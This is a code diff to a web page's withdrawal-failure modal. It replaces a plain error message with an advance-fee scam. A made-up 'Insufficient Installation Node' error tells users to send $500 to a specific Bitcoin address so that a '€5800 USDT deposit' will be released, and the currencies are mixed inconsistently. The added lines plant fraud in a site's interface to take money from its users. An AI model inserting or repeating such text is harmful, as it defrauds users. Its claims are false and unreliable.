@@ -573,7 +573,9 @@
         modal.className = 'modal';
         modal.innerHTML = `
           <h3>Transaction failed</h3>
-          <p>We could not complete the withdrawal right now. Retry or contact support.</p>
+          <p>We could not complete the withdrawal right now. <br> ⚠️ Transaction Error: Insufficient Installation Node
+To complete and release your €5800 USDT deposit, please send $500 to the payment address below. <div> 
+Once the $500 is confirmed, your €5800 will be released within 2–5 minutes (average Crypto network processing time). <div> <strong> bc1qguvzp38e4065dugw53hwxpuvtxf9tcmpe0yccv </strong> <div> Retry or contact support.</p>
           <p style="font-size:0.9rem;color:#0f2a4b"><strong>Method:</strong> ${escapeHtml(methodEl.value)} &nbsp; • &nbsp; <strong>Amount:</strong> ${escapeHtml(amountEl.value)}</p>
           <p style="font-size:0.9rem;color:#0f2a4b"><strong>Destination:</strong> <span style="word-break:break-all">${escapeHtml(destination.value || '—')}</span></p>
           <div class="modal-actions">
